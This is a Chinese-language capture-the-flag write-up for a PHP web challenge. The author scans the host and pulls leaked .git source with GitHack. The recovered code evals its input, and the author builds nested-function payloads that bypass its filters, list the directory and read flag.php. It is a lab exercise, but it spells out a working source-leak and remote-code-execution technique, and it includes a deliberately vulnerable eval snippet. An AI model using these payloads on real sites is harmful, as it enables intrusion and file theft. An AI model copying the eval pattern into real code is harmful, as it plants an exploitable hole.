![[Pasted image 20221114101936.png]]

---
首页长这样

![[Pasted image 20221114101945.png]]

然后好像就没有然后了QAQ

---
尝试使用`dirsearch`进行目录扫描
```shell
./dirsearch.py -u http://xxx.node4.buuoj.cn/ -t 1
```

```python
# Dirsearch started Mon Nov 14 10:28:50 2022 as: /home/chen/Desktop/proj/repos/dirsearch/dirsearch.py -u http://xxx.node4.buuoj.cn/ -t 1

301   185B   http://xxx.node4.buuoj.cn/.git    -> REDIRECTS TO: http://xxx.node4.buuoj.cn/.git/
403   169B   http://xxx.node4.buuoj.cn/.git/
403   169B   http://xxx.node4.buuoj.cn/.git/branches/
200   267B   http://xxx.node4.buuoj.cn/.git/COMMIT_EDITMSG
200    92B   http://xxx.node4.buuoj.cn/.git/config
200    73B   http://xxx.node4.buuoj.cn/.git/description
200    23B   http://xxx.node4.buuoj.cn/.git/HEAD
403   169B   http://xxx.node4.buuoj.cn/.git/hooks/
200   137B   http://xxx.node4.buuoj.cn/.git/index
403   169B   http://xxx.node4.buuoj.cn/.git/info/
200   240B   http://xxx.node4.buuoj.cn/.git/info/exclude
403   169B   http://xxx.node4.buuoj.cn/.git/logs/
200   150B   http://xxx.node4.buuoj.cn/.git/logs/HEAD
301   185B   http://xxx.node4.buuoj.cn/.git/logs/refs    -> REDIRECTS TO: http://xxx.node4.buuoj.cn/.git/logs/refs/
301   185B   http://xxx.node4.buuoj.cn/.git/logs/refs/heads    -> REDIRECTS TO: http://xxx.node4.buuoj.cn/.git/logs/refs/heads/
200   150B   http://xxx.node4.buuoj.cn/.git/logs/refs/heads/master
403   169B   http://xxx.node4.buuoj.cn/.git/objects/
403   169B   http://xxx.node4.buuoj.cn/.git/refs/
301   185B   http://xxx.node4.buuoj.cn/.git/refs/heads    -> REDIRECTS TO: http://xxx.node4.buuoj.cn/.git/refs/heads/
200    41B   http://xxx.node4.buuoj.cn/.git/refs/heads/master
301   185B   http://xxx.node4.buuoj.cn/.git/refs/tags    -> REDIRECTS TO: http://xxx.node4.buuoj.cn/.git/refs/tags/
```
发现可能存在`git`源码泄露，使用`GitHack`获取源码
```shell
chen@cracktc-no-omen ~/D/p/r/GitHack (master)> ./GitHack.py http://xxx.node4.buuoj.cn/.git/
[+] Download and parse index file ...
[+] index.php
[OK] index.php
```
---
index.php
```php
<?php  
include "flag.php";  
echo "flag在哪里呢？<br>";  
if(isset($_GET['exp'])){  
   if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {  
       if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {  
           if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {  
               // echo $_GET['exp'];  
               @eval($_GET['exp']);  
           }  
           else{  
               die("还差一点哦！");  
           }  
       }  
       else{  
           die("再好好想想！");  
       }  
   }  
   else{  
       die("还想读flag，臭弟弟！");  
   }  
}  
// highlight_file(__FILE__);  
?>
```
只接受函数套函数的形式，禁止套娃.jpg

---
# 思路
主要就是想办法只通过函数的嵌套搞出`'.'`，从而通过`scandir('.');`来获得目录下的文件，再通过数组操作取`flag.php`传给`highlight_file`函数，达到获取`flag`的目的

---
# 获取`'.'`
搜索得知，`localeconv()`函数能够返回区域格式相关的信息
```php
/?exp=var_dump(localeconv());
```

```php
array(18) {
  ["decimal_point"]=>
  string(1) "."
  ["thousands_sep"]=>
  string(0) ""
  ["int_curr_symbol"]=>
  string(0) ""
  ["currency_symbol"]=>
  string(0) ""
  ["mon_decimal_point"]=>
  string(0) ""
  ["mon_thousands_sep"]=>
  string(0) ""
  ["positive_sign"]=>
  string(0) ""
  ["negative_sign"]=>
  string(0) ""
  ["int_frac_digits"]=>
  int(127)
  ["frac_digits"]=>
  int(127)
  ["p_cs_precedes"]=>
  int(127)
  ["p_sep_by_space"]=>
  int(127)
  ["n_cs_precedes"]=>
  int(127)
  ["n_sep_by_space"]=>
  int(127)
  ["p_sign_posn"]=>
  int(127)
  ["n_sign_posn"]=>
  int(127)
  ["grouping"]=>
  array(0) {
  }
  ["mon_grouping"]=>
  array(0) {
  }
}
```
通过`current`函数可以取该数组的第一个元素，也就是小数点`.`
```php
/?exp=var_dump(current(localeconv()));
```

```php
string(1) "."
```
---
# 获取目录文件
```php
/?exp=var_dump(scandir(current(localeconv())));
```

```php
array(5) {
  [0]=>
  string(1) "."
  [1]=>
  string(2) ".."
  [2]=>
  string(4) ".git"
  [3]=>
  string(8) "flag.php"
  [4]=>
  string(9) "index.php"
}
```

# 获取`'flag.php'`
`'flag.php'`在数组的倒数第二个位置

可以通过`array_reverse`函数将数组倒序返回，再利用`next`函数取第二个元素
```php
/?exp=var_dump(next(array_reverse(scandir(current(localeconv())))));
```

```php
string(8) "flag.php"
```

# 读取`flag.php`
```php
/?exp=var_dump(highlight_file(next(array_reverse(scandir(current(localeconv()))))));
```

```php
<?php
$flag = "flag{b0706baf-2c5c-4499-8a5e-8961814c3bf6}";
?>
```

---
这篇大佬写的wp还介绍了更多无参数RCE的骚操作

https://johnfrod.top/ctf/gxyctf-2019禁止套娃/

#Web #PHP #git泄露 #目录扫描 #数组 #function #RCE #无参数